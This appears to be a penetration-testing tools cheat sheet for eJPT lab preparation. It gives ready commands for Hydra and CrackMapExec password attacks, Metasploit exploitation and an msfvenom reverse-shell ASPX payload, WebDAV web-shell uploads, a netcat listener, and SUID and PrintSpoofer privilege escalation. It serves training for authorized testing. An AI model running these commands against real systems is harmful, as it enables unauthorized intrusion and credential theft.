# eJPT CTF Write-ups — Tools Reference

**Course:** INE / eJPT — Penetration Testing  
**Lab:** Tools Reference  
**Author:** Zeliha Zengin

---

> *All commands are for authorized lab and exam environments only.*

## Reconnaissance & Scanning

### Nmap — network & service scanner

The first tool in almost every lab. Finds open ports, service versions, and runs default enumeration scripts.

```bash
nmap -sV -sC -Pn -A -p- target.ine.local
# -sV service/version   -sC default scripts
# -A OS/traceroute/scripts   -Pn skip host discovery   -p- all 65535 ports
```

### Nessus — vulnerability scanner

Web-driven scanner that fingerprints hosts and maps findings to known CVEs. Used to prioritize which service to attack first.

## Web Content Discovery

### dirb / gobuster — directory & file brute-forcing

Discover hidden paths (admin panels, WebDAV, uploads, plugin folders) by trying wordlist entries against the web server.

```bash
dirb http://target.ine.local
gobuster dir -u http://target.ine.local -w /usr/share/wordlists/dirb/common.txt
# plugin enumeration example:
gobuster dir -u http://target/wp-content/plugins/ -w /usr/share/nmap/nselib/data/wp-plugins.lst
```

### HTTrack — website mirroring

Downloads a full copy of a site for offline review — useful for spotting comments, hidden fields, and source hints without hammering the live target.

```bash
httrack http://target.ine.local -O ./mirror
```

## Credential Attacks

### Hydra — online password brute-forcing

Throws a wordlist at a live service (SSH, HTTP auth, SMB, FTP…). `-l`/`-L` set the user(s), `-P` the password list.

```bash
hydra -l bob -P unix_passwords.txt target.ine.local http-get
hydra -L common_users.txt -P unix_passwords.txt smb://target.ine.local
hydra -l user -P unix_passwords.txt ssh://target.ine.local
```

### CrackMapExec — modern SMB/AD swiss-army knife

Where Hydra's legacy SMB module fails against SMBv2/v3, CrackMapExec succeeds. Validates creds, lists shares, and sprays passwords.

```bash
crackmapexec smb target.ine.local -u user -p passwords.txt
crackmapexec smb target.ine.local -u administrator -p pineapple --shares
```

### John the Ripper / Hashcat — offline hash cracking

Once you have a hash (from a leak, `/etc/shadow`, or a captured file), crack it offline against a wordlist.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt   # -m 0 = MD5
```

## SMB Enumeration & Access

### smbclient / smbmap — browse and read shares

`smbclient` is an interactive FTP-like client; `smbmap` lists shares and permissions at a glance. `smbclient` has no `cat` — use `more` or `mget`.

```bash
smbclient -L //target.ine.local -U user
smbmap -H target.ine.local -u user -p password
smbclient //target.ine.local/C$ -U administrator
```

### enum4linux — all-in-one SMB/Windows enumeration

Wraps the Samba tools to dump users, shares, groups, and policy in one pass.

```bash
enum4linux -a target.ine.local
```

## Exploitation Frameworks

### Metasploit (msfconsole / msfvenom)

The core exploitation framework: search for a module, set options, and run. `msfvenom` builds standalone payloads (e.g. an ASPX web shell).

```bash
msfconsole -q
search <service or CVE>
use 0
show options
set RHOSTS target.ine.local
set LHOST <your-ip>
exploit

# standalone payload:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=1234 -f aspx > shell.aspx
```

> **Note:** Match the payload architecture to the target — an x86 payload on an x64 host often fails to stage a session.

### searchsploit — Exploit-DB on the command line

Searches a local copy of Exploit-DB for public exploits that match a service/version from Nmap.

```bash
searchsploit flatCore CMS
searchsploit duplicator
```

## Shells, Upload & File Transfer

### Netcat (nc) — listeners & raw connections

Catches reverse shells and talks to raw services (e.g. a localhost-only port found with `netstat`).

```bash
nc -lvnp 1234            # listener for a reverse shell
nc -nv 127.0.0.1 8888    # connect to a local service
```

### Cadaver / davtest — WebDAV client & tester

`davtest` probes what a WebDAV server will accept; `cadaver` is a purpose-built WebDAV client for uploading a web shell.

```bash
davtest -auth bob:password_123321 -url http://target/webdav
cadaver http://target/webdav/
dav:/> put /usr/share/webshells/asp/webshell.asp
```

### rsync — remote sync (and leaky backups)

An exposed rsync daemon can list and hand over whole backup modules without authentication.

```bash
rsync rsync://target/            # list modules
rsync -av rsync://target/backup ./backup
```

### FTP / curl / OpenSSL — grab and move files

`ftp` uploads/downloads over a writable FTP dir (a classic upload-to-RCE when served by a web root); `curl` reads authenticated URLs; `openssl` handles TLS endpoints and quick crypto.

```bash
ftp target.ine.local      # then: put shell.aspx / get flag.txt
curl http://target/webdav/flag1.txt -u bob:password_123321
openssl s_client -connect target:443
```

## Databases

### MSSQL / MySQL clients

Authenticate to a database service to read data or, with Metasploit's MSSQL modules, pivot to command execution on the host.

```bash
mysql -h target.ine.local -u root -p
# MSSQL is usually driven through Metasploit's mssql_* modules
```

## Privilege Escalation

### GTFOBins + SUID abuse

After a foothold, hunt for SUID binaries and cross-reference GTFOBins for a known escalation.

```bash
find / -perm -4000 -type f 2>/dev/null
find / -exec /bin/bash -p \; -quit        # SUID find → root shell
```

### strace — trace a privileged binary

Reveals how a setuid/sudo program calls helpers — exposing a relative or overwritable binary you can hijack for root.

```bash
strace ./welcome        # see which helper it executes
```

### PrintSpoofer — Windows SeImpersonate privesc

On Windows, when a service account holds `SeImpersonatePrivilege` (check with `whoami /priv`), PrintSpoofer abuses it to spawn a SYSTEM shell.

```bash
PrintSpoofer.exe -i -c cmd
```

## Traffic Analysis & Proxies

### Wireshark — packet analysis

Reads a PCAP to reconstruct an attack: filter HTTP, follow TCP streams, and pull out hosts, files, and credentials.

```bash
http.response.code == 200
nbns                # NetBIOS hostnames (UDP 137)
# Right-click a packet → Follow → TCP Stream
```

### Burp Suite — intercepting web proxy

Sits between browser and server to inspect and tamper with requests — used to reach CGI endpoints and manipulate parameters.

## Common Wordlists

| Path | Use |
| --- | --- |
| /usr/share/wordlists/rockyou.txt | General password cracking (gunzip first) |
| /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt | Service brute-forcing |
| /usr/share/metasploit-framework/data/wordlists/common_users.txt | Username spraying |
| /usr/share/nmap/nselib/data/wp-plugins.lst | WordPress plugin enumeration |
| /usr/share/wordlists/dirb/common.txt | Directory brute-forcing |

---

*Write-up by Zeliha Zengin · eJPT preparation*